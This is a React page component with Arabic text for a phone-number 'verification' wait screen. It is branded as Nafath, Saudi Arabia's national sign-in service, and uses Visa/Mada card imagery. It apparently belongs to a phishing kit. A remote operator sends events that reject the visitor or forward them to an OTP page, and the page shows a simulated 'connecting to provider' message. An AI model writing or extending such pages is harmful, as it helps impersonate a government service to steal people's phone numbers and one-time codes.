import { useEffect, useState, useCallback } from "react";
import { useLocation } from "wouter";
import { Header } from "@/components/layout/Header";
import { Loader2, XCircle } from "lucide-react";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function NomerWait() {
  const [, setLocation] = useLocation();
  const [message, setMessage] = useState("جارٍ التحقق من الرقم...");
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  
  const sessionId = localStorage.getItem("sessionId");
  
  // Handle SSE control events
  const handleSSEMessage = useCallback((event: MessageEvent) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.action === "nomer_error") {
        console.log("[NomerWait] Received nomer error");
        setError(true);
        setErrorMessage("رقم الهاتف غير صحيح. يرجى التأكد وإعادة المحاولة.");
        setMessage("تم رفض الطلب");
      } else if (data.action === "go_otp") {
        console.log("[NomerWait] Received go_otp, navigating to nomer-otp");
        localStorage.setItem("nomerVerified", "true");
        setLocation("/nomer-otp");
      }
    } catch (error) {
      console.error("[NomerWait] Error parsing SSE message:", error);
    }
  }, [setLocation]);

  // Set up SSE listener
  useEffect(() => {
    if (!sessionId) return;
    
    const apiUrl = import.meta.env.VITE_API_URL || "";
    const baseUrl = apiUrl || window.location.origin;
    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;
    
    const eventSource = new EventSource(sseUrl);
    
    // Listen for control events
    eventSource.addEventListener("control", handleSSEMessage);
    
    // Cleanup
    return () => {
      eventSource.removeEventListener("control", handleSSEMessage);
      eventSource.close();
    };
  }, [sessionId, handleSSEMessage]);

  useEffect(() => {
    if (error) return;
    
    // Simulate checking process
    const timer = setTimeout(() => {
      setMessage("جارٍ الاتصال بمزود الخدمة...");
    }, 3000);

    return () => clearTimeout(timer);
  }, [error]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-6 object-contain" />
          
          <div className="flex flex-col items-center justify-center mb-6">
            {error ? (
              <XCircle className="w-16 h-16 text-red-500 mb-4" />
            ) : (
              <Loader2 className="w-16 h-16 animate-spin text-primary mb-4" />
            )}
          </div>
          
          <h2 className="text-xl font-bold text-gray-800 mb-4">التحقق من رقم الجوال</h2>
          
          <p className="text-gray-600 mb-8 leading-relaxed">
            {error ? errorMessage : message}
          </p>
          
          {!error && (
            <p className="text-sm text-gray-500">
              يرجى عدم إغلاق هذه الصفحة
            </p>
          )}
        </div>
      </div>

      {/* Footer */}
      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
